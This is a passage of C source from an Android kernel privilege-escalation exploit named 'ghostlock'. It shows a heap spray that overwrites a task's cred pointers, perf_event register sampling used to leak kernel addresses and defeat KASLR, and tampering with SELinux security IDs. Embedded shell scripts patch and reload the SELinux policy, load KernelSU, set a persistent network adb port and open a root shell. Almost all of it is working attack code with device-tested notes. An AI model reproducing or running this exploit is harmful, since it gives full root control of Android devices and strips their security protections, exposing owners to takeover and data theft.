    /* Plan 0 is baked into the payload by prepare_skb_payload as the
     * selinux zero-write (W0.pi_tree = {pc=(selinux-8)|1, right=0,
     * left=0}). Push the two cred plans for the following overlay
     * rounds: cred first (getuid/exec read task->cred), then real_cred
     * (commit_creds at exec BUG_ONs unless cred == real_cred, so both
     * pointer writes are required before any execve). Three erases fit
     * the three rungs of the nice ladder: 0->7, 7->14, 14->19. */
    ghost_push_plan(g_leaked_task + TASK15_CRED_OFF,
                    page_base + FAKE_CRED_OFF);
    ghost_push_plan(g_leaked_task + TASK15_REAL_CRED_OFF,
                    page_base + FAKE_CRED_OFF);
    pr_info("  walk0: selinux zero, walk1: cred, walk2: real_cred, "
            "fake_cred=%016zx plans=%d\n",
            page_base + FAKE_CRED_OFF, ghost_plan_count());
  }
  TIMER("  heap spray done");
  run_main_route_threads();
  clear_pselect_write();
  return 1;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (efd < 0) return 1;
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static int write_selinux_policy_fix_script(void) {
  static const char fix_script[] =
    "#!/system/bin/sh\n"
    "P=/sys/fs/selinux/policy\n"
    "L=/sys/fs/selinux/load\n"
    "T=/data/local/tmp/.ghostlock_policy.bin\n"
    "LOG=/data/local/tmp/.ghostlock_policy.log\n"
    "exec >>$LOG 2>&1\n"
    "echo \"[*] policy fix: uid=$(id -u) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null)\"\n"
    "cp $P $T || { echo '[!] policy fix: policy copy failed'; exit 1; }\n"
    "SZ=$(wc -c < $T)\n"
    "[ \"$SZ\" -gt 20 ] || { echo \"[!] policy fix: policy too short ($SZ bytes)\"; exit 1; }\n"
    "ID_LEN=$(dd if=$T bs=1 skip=4 count=4 2>/dev/null | od -A n -t u4 | tr -d ' ')\n"
    "CO=$((4 + 4 + ID_LEN + 4))\n"
    "CFG=$(dd if=$T bs=1 skip=$CO count=4 2>/dev/null | od -A n -t u4 | tr -d ' ')\n"
    "NEW=$(( CFG | 0xC0000000 ))\n"
    "if [ \"$NEW\" != \"$CFG\" ]; then\n"
    "  printf '\\\\x%02x\\\\x%02x\\\\x%02x\\\\x%02x' "
      "$((NEW & 0xFF)) $(((NEW>>8) & 0xFF)) $(((NEW>>16) & 0xFF)) $(((NEW>>24) & 0xFF))"
      " | dd of=$T bs=1 seek=$CO conv=notrunc 2>/dev/null\n"
    "  echo \"[*] policy fix: config=$CFG -> $NEW at offset=$CO (netlink flags restored)\"\n"
    "else\n"
    "  echo \"[*] policy fix: config=$CFG at offset=$CO (already has netlink flags)\"\n"
    "fi\n"
    "# /sys/fs/selinux/load accepts the complete policy in one write only.\n"
    "if dd if=$T of=$L bs=$SZ count=1; then\n"
    "  echo '[+] policy fix: policy load succeeded'\n"
    "  rm -f $T\n"
    "  exit 0\n"
    "fi\n"
    "echo '[!] policy fix: policy load failed'\n"
    "rm -f $T\n"
    "exit 1\n";
  int sfd = open("/data/local/tmp/.ghostlock_fixpol.sh", O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (sfd < 0) {
    pr_info("fix_policy: write script failed errno=%d\n", errno);
    return 0;
  }
  ssize_t wrote = write(sfd, fix_script, strlen(fix_script));
  close(sfd);
  if (wrote != (ssize_t)strlen(fix_script)) {
    pr_info("fix_policy: script write failed ret=%zd errno=%d\n", wrote, errno);
    return 0;
  }
  return 1;
}

static int kernelsu_module_loaded(void) {
  int fd = open("/proc/modules", O_RDONLY);
  if (fd < 0) return 0;

  char modules[8192] = {0};
  ssize_t n = read(fd, modules, sizeof(modules) - 1);
  close(fd);
  return n > 0 && strstr(modules, "kernelsu ") != NULL;
}

static int wait_for_ksu_status(void) {
  static const char status_path[] = "/data/local/tmp/.ghostlock_ksu.status";

  for (int attempt = 1; attempt <= 40; attempt++) {
    /* The late-load helper can be replaced or blocked as the module comes
     * online. /proc/modules is observable from this original shell and is
     * therefore the authoritative readiness signal. */
    if (kernelsu_module_loaded()) {
      pr_success("KernelSU module is loaded\n");
      return 0;
    }

    char status[128] = {0};
    int fd = open(status_path, O_RDONLY);
    if (fd >= 0) {
      ssize_t n = read(fd, status, sizeof(status) - 1);
      close(fd);
      if (n > 0) {
        status[strcspn(status, "\r\n")] = '\0';
        if (!strcmp(status, "ready")) {
          pr_success("KernelSU helper reports ready\n");
          return 0;
        }
        if (!strncmp(status, "failed:", 7)) {
          pr_error("KernelSU helper reports %s; see .ghostlock_root.log and .ghostlock_ksud.log\n",
                   status);
          return 1;
        }
      }
    }
    if (attempt == 1 || attempt % 10 == 0) {
      pr_info("waiting for KernelSU helper status (%d/40)\n", attempt);
    }
    sleep(1);
  }

  pr_error("KernelSU helper did not report readiness; see .ghostlock_root.log and .ghostlock_ksud.log\n");
  return 1;
}

static void slab_drain(void) {
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 5 : 2;
  int batch = (up.tv_sec > 60) ? 400 : 200;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc(batch, sizeof(pid_t));
    int n = 0;
    for (int i = 0; i < batch; i++) {
      drain[i] = fork();
      if (drain[i] == 0) { pause(); _exit(0); }
      if (drain[i] > 0) n++;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
  }
}

static void write_root_script(void) {
  int sfd = open("/data/local/tmp/.ghostlock_root.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
  if (sfd < 0) return;
  int policy_script_ready = write_selinux_policy_fix_script();
  unlink("/data/local/tmp/.ghostlock_ksu.status");
  const char *script =
    "#!/system/bin/sh\n"
    "ROOT_LOG=/data/local/tmp/.ghostlock_root.log\n"
    "STATUS=/data/local/tmp/.ghostlock_ksu.status\n"
    "diag() { echo \"$*\"; echo \"$*\" >>$ROOT_LOG; }\n"
    "report_status() { printf '%s\\n' \"$1\" >$STATUS; }\n"
    "report_status pending\n"
    "diag '[+] root shell pid='$$' uid='$(id -u)\n"
    "if [ -x /data/local/tmp/.ghostlock_fixpol.sh ]; then\n"
    "  diag '[*] repairing SELinux policy before KernelSU'\n"
    "  if /system/bin/sh /data/local/tmp/.ghostlock_fixpol.sh; then\n"
    "    diag '[+] early SELinux policy repair succeeded'\n"
    "    diag '[*] keeping SELinux permissive until KernelSU is ready'\n"
    "  else\n"
    "    diag '[!] early SELinux policy repair failed; see .ghostlock_policy.log'\n"
    "  fi\n"
    "  rm -f /data/local/tmp/.ghostlock_fixpol.sh\n"
    "else\n"
    "  diag '[!] policy repair script was not created'\n"
    "fi\n"
    "KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
    "KSU_READY=0\n"
    "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
    "  diag '[+] KernelSU already loaded'\n"
    "  KSU_READY=1\n"
    "elif [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
    "  diag '[*] ksud:' $KSUD\n"
    "  chmod 755 \"$KSUD\" 2>/dev/null\n"
    "  KVER=$(uname -r | cut -d. -f1-2)\n"
    "  AVER=$(uname -r | grep -o 'android[0-9]*')\n"
    "  KMI=\"${AVER}-${KVER}\"\n"
    "  diag '[*] KMI=' $KMI\n"
    "  mkdir -p /data/adb/ksu 2>/dev/null\n"
    "  diag '[*] ksud late-load --kmi' $KMI\n"
    "  KSUD_LOG=/data/local/tmp/.ghostlock_ksud.log\n"
    "  rm -f \"$KSUD_LOG\"\n"
    "  setsid \"$KSUD\" late-load --kmi \"$KMI\" </dev/null >\"$KSUD_LOG\" 2>&1 &\n"
    "  KSUD_PID=$!\n"
    "  diag '[*] ksud pid='$KSUD_PID\n"
    "  KSUD_EXITED=0\n"
    "  for w in $(seq 1 30); do\n"
    "    if ! kill -0 \"$KSUD_PID\" 2>/dev/null; then KSUD_EXITED=1; break; fi\n"
    "    sleep 1\n"
    "  done\n"
    "  if [ \"$KSUD_EXITED\" = 1 ]; then\n"
    "    wait \"$KSUD_PID\"; KSUD_STATUS=$?\n"
    "    diag '[*] ksud exit='$KSUD_STATUS\n"
    "  else\n"
    "    diag '[!] ksud still running after 30s; capturing process state'\n"
    "    cat /proc/$KSUD_PID/status >>$ROOT_LOG 2>&1\n"
    "    cat /proc/$KSUD_PID/wchan >>$ROOT_LOG 2>&1\n"
    "  fi\n"
    "  if [ -s \"$KSUD_LOG\" ]; then\n"
    "    diag '[*] ksud output:'\n"
    "    tail -n 40 \"$KSUD_LOG\"\n"
    "    tail -n 40 \"$KSUD_LOG\" >>$ROOT_LOG\n"
    "  fi\n"
    "fi\n"
    "if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; fi\n"
    "if [ \"$KSU_READY\" = 1 ]; then\n"
    "  diag '[+] KSU LOADED'\n"
    "  grep kernelsu /proc/modules\n"
    "  RSPROP=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "  if [ -n \"$RSPROP\" ]; then\n"
    "    chmod 755 \"$RSPROP\" 2>/dev/null\n"
    "    ADB_PORT=$(cat /data/local/tmp/a/adb_port 2>/dev/null || echo 5555)\n"
    "    \"$RSPROP\" resetprop -p persist.adb.tcp.port $ADB_PORT 2>&1 && echo \"[+] persist.adb.tcp.port=$ADB_PORT set via resetprop\"\n"
    "    \"$RSPROP\" resetprop service.adb.tcp.port $ADB_PORT 2>/dev/null\n"
    "  fi\n"
    "  rm -f /data/local/tmp/.ghostlock_w1\n"
    "  APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed 's/package://')\n"
    "  if [ -n \"$APK\" ] && [ -x /data/adb/ksud ]; then\n"
    "    /data/adb/ksud kernel dynamic-manager set-apk \"$APK\" 2>/dev/null && echo '[+] dynamic manager set'\n"
    "  fi\n"
    "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "  diag '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
    "  report_status ready\n"
    "  diag '[+] done'\n"
    "else\n"
    "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "  diag '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
    "  report_status failed:module-not-loaded\n"
    "  diag '[!] KSU NOT loaded'\n"
    "fi\n"
    "if [ -t 0 ]; then exec /system/bin/sh -i; fi\n";
  if (!policy_script_ready) {
    pr_info("root script: early policy repair script unavailable\n");
  }
  write(sfd, script, strlen(script));
  close(sfd);
}

uint64_t g_leaked_task = 0;
uintptr_t g_leaked_cred = 0;
int g_route_write_ok = 0;
int g_selinux_write_armed = 0;
int g_selinux_off = 0;
uintptr_t g_selinux_target = 0;
uintptr_t g_init_user_ns_addr = 0;
int g_hit_block = -1;
uintptr_t g_ns_cands[16];
int g_ns_cand_count = 0;

/* ---- raw (libc-free) output helpers for the post-walk path ----------
 * After the walks fire the main thread must not call ANY libc function
 * that can take a lock or touch a futex (printf/malloc deadlocked the
 * exploit on device - the hb->lock wedge, see HANDOVER_2). These
 * helpers format into stack buffers and issue raw syscalls only. */
static void raw_wstr(long fd, const char *s) {
  syscall(__NR_write, fd, s, __builtin_strlen(s));
}
static void raw_whex(long fd, uint64_t v) {
  static const char h[] = "0123456789abcdef";
  char b[19];
  b[0] = '0'; b[1] = 'x';
  for (int i = 0; i < 16; i++)
    b[2 + i] = h[(v >> ((15 - i) * 4)) & 0xf];
  b[18] = 0;
  syscall(__NR_write, fd, b, 18);
}
static void raw_wdec(long fd, long v) {
  char b[24];
  size_t n = 0;
  unsigned long u = (v < 0) ? (unsigned long)(-v) : (unsigned long)v;
  char t[24]; size_t tn = 0;
  do { t[tn++] = (char)('0' + (u % 10)); u /= 10; } while (u);
  if (v < 0) b[n++] = '-';
  while (tn) b[n++] = t[--tn];
  syscall(__NR_write, fd, b, n);
}
#define RAW_WRITE(fd, s) raw_wstr(fd, s)
#define RAW_WERRNO(fd) do { raw_wstr(fd, " errno="); raw_wdec(fd, errno); } while (0)

/* ---- crash-free SID resolution helpers (post-walk: raw syscalls only) ---
 * The fake security blob lives on the reclaim page at FAKE_SEC_BLOB_OFF;
 * blob->sid (+4) is re-read by the kernel on every SELinux hook, so the
 * parent can steer current_sid() through the uring mapping. Verification
 * reads /proc/self/attr/current (self-attr read takes NO avc check, just
 * sid -> context string). The old 32K-openat brute force panicked the
 * device; these helpers back the candidate-first + bounded-scan flow. */
static void blob_set_sid(uint8_t *page, uint32_t sid) {
  for (int f = 0; f < 24; f += 4)
    *(volatile uint32_t *)(page + FAKE_SEC_BLOB_OFF + f) = sid;
  __atomic_thread_fence(__ATOMIC_SEQ_CST);
}

static long sid_read_ctx(char *buf, long buflen) {
  int af = (int)syscall(__NR_openat, AT_FDCWD,
                        "/proc/self/attr/current", O_RDONLY, 0);
  if (af < 0) return -1;
  long an = syscall(__NR_read, af, buf, (size_t)(buflen - 1));
  syscall(__NR_close, af);
  if (an > 0) {
    /* strip trailing NUL / newline the kernel may include */
    while (an > 0 && (buf[an-1] == '\n' || buf[an-1] == 0)) an--;
    buf[an] = 0;
  }
  return an;
}

static long sid_strlen(const char *s) { long n = 0; while (s[n]) n++; return n; }

static int sid_memeq(const char *a, const char *b, long n) {
  for (long i = 0; i < n; i++) if (a[i] != b[i]) return 0;
  return 1;
}

static int sid_contains(const char *hay, long hlen, const char *needle) {
  long nlen = sid_strlen(needle);
  if (nlen == 0 || nlen > hlen) return 0;
  for (long i = 0; i + nlen <= hlen; i++)
    if (sid_memeq(hay + i, needle, nlen)) return 1;
  return 0;
}

/* Does the context readback match the shell creds the relay child had
 * before the exploit? Exact match against the child's context when we
 * have it, else a "shell" substring check. */
static int sid_ctx_is_shell(const char *ctx, long len, const char *child_ctx) {
  if (len <= 0) return 0;
  long clen = sid_strlen(child_ctx);
  if (clen > 0)
    return len == clen && sid_memeq(ctx, child_ctx, clen);
  return sid_contains(ctx, len, "shell");
}

static void sid_nanosleep_usec(long usec) {
  struct timespec ts;
  ts.tv_sec = usec / 1000000;
  ts.tv_nsec = (usec % 1000000) * 1000;
  syscall(__NR_nanosleep, &ts, NULL);
}

/* Leak our own task_struct via PERF_SAMPLE_REGS_INTR: on this kernel
 * `current` lives in SP_EL0 and every syscall path loads it into a normal
 * x register (mrs x8, SP_EL0), so a getpid storm makes the task pointer
 * the modal kernel value in the sampled registers. */
static uintptr_t perf_leak_own_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 31) - 1; /* x0-x30 */
  pe.disabled = 1;

  uint32_t my_tid = (uint32_t)syscall(__NR_gettid);

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 3000000; i++) { syscall(__NR_getpid); __asm__ volatile("yield"); }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[1024]; int nc = 0;
  uint64_t min_ip = (uint64_t)-1;
  int total_samples = 0, my_samples = 0;
  while (pos < head && nc < 1024 * 32) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      /* sample layout: IP(8) + TID{pid(4),tid(4)} + ABI(8) + REGS(31*8) */
      char *p = (char *)ev + sizeof(*ev);
      uint64_t ip; memcpy(&ip, p, 8); p += 8;
      uint32_t s_pid, s_tid;
      memcpy(&s_pid, p, 4); memcpy(&s_tid, p + 4, 4); p += 8;
      if (ip >= 0xffffffc000000000ULL && ip < min_ip) min_ip = ip;
      total_samples++;
      if (s_tid == my_tid) {
        my_samples++;
        uint64_t abi = *(uint64_t *)p; p += 8;
        if (abi == 1 || abi == 2) {
          uint64_t *regs = (uint64_t *)p;
          for (int i = 0; i < 31 && nc < 1024 * 32; i++) {
            uint64_t v = regs[i];
            if (v >= 0xffffff8000000000ULL && v < 0xffffffc000000000ULL)
              cands[nc++ & 1023] = v;
          }
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  pr_info("perf task: %d/%d samples from tid %u\n", my_samples, total_samples, my_tid);
  if (min_ip != (uint64_t)-1) {
    /* KASLR anchor recovery for THIS kernel (VA39, 5.15.170-android14-11):
     *
     * DEVICE-VERIFIED MODEL (pstore boot print + perf symbol leak):
     *   - kaslr_offset() slides by a value ≡ 0x80000 (mod 2MB): two
     *     observed boot prints are "Kernel Offset: 0x1600080000" and
     *     "0x2500080000 from 0xffffffc008000000" -> runtime _text =
     *     2MB_block_base + 0x80000.
     *   - the reference vmlinux (r00, clang-22/LTO_NONE) links _text =
     *     0xffffffc008000000 (2MB-aligned) with symbols at table
     *     offsets measured from _text - but the RUNNING kernel is the
     *     ThinLTO/clang-17 build whose .text prefix is 0x80000 SMALLER:
     *     every device symbol sits at (device _text) + (table offset -
     *     0x80000). Proven live: the perf leak of &init_user_ns matches
     *     (min_ip & ~0x1fffff) + off_init_user_ns on every run.
     *   - .entry.text sits ~0x10000-0xb5000 into the image, so min_ip
     *     (every getpid traverses the el0_svc vector path) always lands
     *     in _text's own 2MB block.
     *
     * Therefore the SYMBOL ANCHOR this exploit needs - the base B such
     * that B + any table offset = the device's true symbol address - is
     * exactly B = min_ip & ~0x1fffff = device _text - 0x80000.
     * (The old `(min_ip & ~0x1fffff) | 0x80000` computed the true _text,
     * but no table offset is relative to it on this build; nothing
     * dereferenced a kaslr address before, so the distinction was never
     * observable.) The sanity gate below checks the anchor: B - link
     * _text must be a 2MB multiple because both the slide (from the
     * boot print) and the -0x80000 layout shift are ≡ 0x80000 mod 2MB. */
    uint64_t base = min_ip & ~0x1fffffULL;
    int base_ok = 1;
    if (active_offsets && active_offsets->kimage_text_base) {
      uint64_t link = active_offsets->kimage_text_base;
      uint64_t slide = base - link; /* unsigned wrap if base < link */
      if (base < link || (slide & (0x200000ULL - 1)) != 0 ||
          slide >= 0x4000000000ULL /* VA39 KASLR region bound */) {
        base_ok = 0;
        pr_warning("perf min_ip=%016lx -> anchor %016lx fails sanity vs "
                   "link _text %016lx (delta must be a 2MB multiple)\n",
                   (unsigned long)min_ip, (unsigned long)base,
                   (unsigned long)link);
      }
    }
    if (base_ok) {
      kaslr_base = base;
      kaslr_done = 1;
      pr_info("kaslr: min_ip=%016lx anchor=%016lx (device _text=%016lx, "
              "slide=%016lx)\n",
              (unsigned long)min_ip, (unsigned long)kaslr_base,
              (unsigned long)(kaslr_base + 0x80000ULL),
              (unsigned long)(kaslr_base + 0x80000ULL -
                (active_offsets ? active_offsets->kimage_text_base : 0)));
    } else {
      /* DO NOT trust kaslr_base: keep kaslr_done = 0 so the mode-7
       * SELinux write (which targets kaslr_base + off_selinux_enforcing)
       * is not armed against a guessed base - a wrong .bss write can
       * panic the kernel. Mode 6 (page-local fake cred) still runs. */
      kaslr_done = 0;
    }
  } else {
    kaslr_done = 0;
  }
  if (!nc) return 0;
  /* top-2 modes: #1 = task, #2 = cred (current_cred() is loaded during
   * getpid on this kernel -- perf_event_open samples both as linmap ptrs) */
  uintptr_t best = 0, second = 0;
  int best_cnt = 0, second_cnt = 0;
  int total = nc > 1024 ? 1024 : nc;
  for (int i = 0; i < total; i++) {
    int cnt = 0;
    for (int j = 0; j < total; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) {
      second = best; second_cnt = best_cnt;
      best_cnt = cnt; best = cands[i];
    } else if (cnt > second_cnt && cands[i] != best) {
      second_cnt = cnt; second = cands[i];
    }
  }
  pr_info("perf own task: 0x%016lx (%d/%d votes)\n", best, best_cnt, total);
  if (second_cnt > 0)
    pr_info("perf cred candidate: 0x%016lx (%d votes)\n", second, second_cnt);
  /* Stash second-mode as potential cred for security-pointer leak */
  extern uintptr_t g_leaked_security_ptr;
  if (second_cnt >= 10 && !g_leaked_security_ptr) {
    /* second is likely cred. cred->security is at cred+0x78.
     * We can't dereference it, but we can use it in the setpriority
     * storm exclusion (perf_leak_cred_security pass 2). */
  }
  g_leaked_cred = second_cnt >= 10 ? second : 0;
  return best;
}

/* Leak &init_user_ns: setpriority(-20) is denied but still runs the full
 * capable(CAP_SYS_NICE) path where security_capable(current_cred(),
 * &init_user_ns, ...) hands &init_user_ns to the SELinux hook chain
 * (x0=cred, x1=ns in selinux_capable). Collect modal image-VA pointers. */
#define MAX_NS_CANDS 16
static int perf_leak_init_user_ns(uintptr_t task, uintptr_t *out) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  pe.sample_period = 2000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 31) - 1;
  pe.disabled = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open(ns) failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap(ns) failed\n"); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 60000; i++) {
    setpriority(PRIO_PROCESS, 0, -20);
    syscall(__NR_getpid);
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[512]; int nc = 0;
  while (pos < head && nc < 512 * 16) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 31 && nc < 512 * 16; i++) {
          uint64_t v = regs[i];
          /* image VA range (text+rodata+data): kaslr_base .. +0x1d00000 */
          if (v >= kaslr_base && v < kaslr_base + 0x1D00000ULL &&
              (v & 7) == 0 && v != task)
            cands[nc++ & 511] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  /* rank by frequency */
  int total = nc > 512 ? 512 : nc;
  uintptr_t ranked[MAX_NS_CANDS]; int ranked_cnt[MAX_NS_CANDS]; int nrank = 0;
  for (int i = 0; i < total && nrank < MAX_NS_CANDS; i++) {
    int found = -1;
    for (int j = 0; j < nrank; j++) if (ranked[j] == cands[i]) { found = j; break; }
    if (found >= 0) { ranked_cnt[found]++; continue; }
    ranked[nrank] = cands[i]; ranked_cnt[nrank] = 1; nrank++;
  }
  /* sort desc */
  for (int i = 0; i < nrank - 1; i++)
    for (int j = i + 1; j < nrank; j++)
      if (ranked_cnt[j] > ranked_cnt[i]) {
        uintptr_t t = ranked[i]; ranked[i] = ranked[j]; ranked[j] = t;
        int tc = ranked_cnt[i]; ranked_cnt[i] = ranked_cnt[j]; ranked_cnt[j] = tc;
      }
  for (int i = 0; i < nrank && i < MAX_NS_CANDS; i++)
    out[i] = ranked[i];
  int got = nrank < MAX_NS_CANDS ? nrank : MAX_NS_CANDS;
  for (int i = 0; i < got; i++)
    pr_info("init_user_ns candidate[%d]: %016lx (%d votes)\n", i,
            (unsigned long)out[i], ranked_cnt[i]);
  return got;
}

/* perf_find_task - only used when perf is available (shell context) */
static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256]; int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uintptr_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  return best;
}

/* Device-side validation of the offsets table BEFORE the mode-7 blind
 * write: perf-sample the register that security_capable() receives as
 * &init_user_ns during a setpriority(-20) storm (denied, but the full
 * capable() path still runs) and check that kaslr_base +
 * off_init_user_ns appears among the modal image-range candidates.
 * init_user_ns lives in the same .data/.bss region as selinux_state
 * (0x121B080 vs 0x13796D0 on this kernel), so a match proves the
 * RUNNING kernel's data layout matches this table (the device kernel
 * is built with a different toolchain than the reference vmlinux, and
 * nothing else validated a .data symbol on device yet). Returns 1 on
 * match, 0 on mismatch/leak-failure (caller falls back to mode 6). */
/* Leak + rank the image-range register candidates of a setpriority(-20)
 * storm (the capable() path). INFORMATIONAL ONLY since the device .data
 * layout is shifted ~+0x750000 from the reference vmlinux: the device's
 * real &init_user_ns is ~anchor+0x19EB898 (observed), while the reference
 * table says anchor+0x121B080 (a .rodata address on the device - matching
 * it is a false positive). The storm is kept because (a) the candidate
 * census is useful diagnostics, and (b) RLIMIT_NICE=40 on this device
 * lets the setpriority calls succeed, parking the main thread at nice
 * -20, which the later threads inherit and which protects the critical
 * discard->capture window from preemption. */
static int validate_device_symbol_layout(void) {
  uintptr_t want = kaslr_base + active_offsets->off_init_user_ns;
  uintptr_t cands[MAX_NS_CANDS];
  int n = perf_leak_init_user_ns(g_leaked_task, cands);
  g_ns_cand_count = 0;
  for (int i = 0; i < n && i < 16; i++)
    g_ns_cands[i] = cands[i];
  if (n > 0)
    g_ns_cand_count = n < 16 ? n : 16;
  if (n <= 0) {
    pr_warning("ns storm leak: no candidates\n");
    return 0;
  }
  for (int i = 0; i < n; i++) {
    if (cands[i] == want) {
      pr_info("ns storm: candidate[%d] == reference-table init_user_ns "
              "%016lx (KNOWN false positive on the device layout - "
              "informational only; main thread now parked at nice -20)\n",
              i + 1, (unsigned long)want);
      g_init_user_ns_addr = cands[i];
      return 1;
    }
  }
  pr_info("ns storm: reference-table init_user_ns %016lx not among "
             "candidates (expected on the device layout; informational "
             "only; main thread now parked at nice -20)\n",
             (unsigned long)want);
  return 0;
}

/* Leak cred->security pointer via differential perf storms.
 * Pass 1 (getuid): linear-map pointers excluding task -> top mode = cred
 * Pass 2 (setpriority): linear-map pointers excluding task+cred -> top = security
 * getuid never calls SELinux hooks, so security only appears in pass 2. */
uintptr_t g_leaked_security_ptr = 0;
/* Single-pass security leak: setpriority storm excluding task+cred.
 * cred comes from perf_leak_own_task's second mode (g_leaked_cred). */
static uintptr_t perf_leak_cred_security(uintptr_t task) {
  extern uintptr_t g_leaked_cred;
  if (!g_leaked_cred) {
